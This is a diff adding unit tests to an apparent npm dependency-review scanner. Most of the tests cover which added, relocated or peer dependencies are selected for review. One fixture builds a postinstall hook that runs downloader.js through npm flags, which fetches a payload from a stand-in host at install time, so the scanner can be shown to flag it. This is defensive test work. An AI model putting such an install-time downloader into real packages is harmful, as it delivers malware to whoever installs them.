@@ -94,6 +94,44 @@ describe("selectAddedDependencies", () => {
     expect(selected).toEqual([]);
   });
 
+  test("a dependency relocated to a different installing spec is reviewed again", () => {
+    const selected = selectAddedDependencies(
+      diffOf(
+        { name: "p", dependencies: { sharp: "^0.32.0" } },
+        { name: "p", optionalDependencies: { sharp: "^0.33.0" } },
+      ),
+    );
+    expect(selected).toEqual([
+      {
+        name: "sharp",
+        section: "optionalDependencies",
+        spec: "^0.33.0",
+        declarationKind: "range",
+      },
+    ]);
+  });
+
+  test("an optional override with a different effective spec is reviewed", () => {
+    const selected = selectAddedDependencies(
+      diffOf(
+        { name: "p", dependencies: { sharp: "^0.32.0" } },
+        {
+          name: "p",
+          dependencies: { sharp: "^0.32.0" },
+          optionalDependencies: { sharp: "^0.33.0" },
+        },
+      ),
+    );
+    expect(selected).toEqual([
+      {
+        name: "sharp",
+        section: "optionalDependencies",
+        spec: "^0.33.0",
+        declarationKind: "range",
+      },
+    ]);
+  });
+
   test("a required peer duplicated into dependencies was already installed", () => {
     const selected = selectAddedDependencies(
       diffOf(
@@ -141,6 +179,22 @@ describe("selectAddedDependencies", () => {
       ),
     );
     expect(selected).toEqual([]);
+  });
+
+  test("a newly required peer at a different runtime spec is reviewed", () => {
+    const selected = selectAddedDependencies(
+      diffOf(
+        { name: "p", dependencies: { react: "^18.0.0" } },
+        {
+          name: "p",
+          dependencies: { react: "^18.0.0" },
+          peerDependencies: { react: "^19.0.0" },
+        },
+      ),
+    );
+    expect(selected).toEqual([
+      { name: "react", section: "peerDependencies", spec: "^19.0.0", declarationKind: "range" },
+    ]);
   });
 
   test("an optional peer becoming required is not new code when the runtime spec already exists", () => {
@@ -420,6 +474,29 @@ describe("assessDependencyArtifact", () => {
     expect(assessment.installReachableCapabilities).toContain("code.network-access");
     expect(assessment.installReachUnproven).toBe(false);
   });
+
+  test.each(["npm --silent run setup", "npm run --silent setup"])(
+    "npm flags cannot hide a delegated install downloader: %s",
+    (postinstall) => {
+      const manifest = {
+        name: "n",
+        version: "1.0.0",
+        scripts: { postinstall, setup: "node downloader.js" },
+      };
+      const assessment = assessDependencyArtifact(
+        [
+          file("package.json", JSON.stringify(manifest)),
+          file("downloader.js", "fetch('https://cdn.example.invalid/payload');"),
+        ],
+        manifest,
+        { codePatternSet: "javascript", entrypointResolution: "npm" },
+      );
+
+      expect(assessment.verdict).toBe("install-risk");
+      expect(assessment.installReachableCapabilities).toContain("code.network-access");
+      expect(assessment.installReachUnproven).toBe(false);
+    },
+  );
 });
 
 describe("dependencyEvidenceFindings", () => {
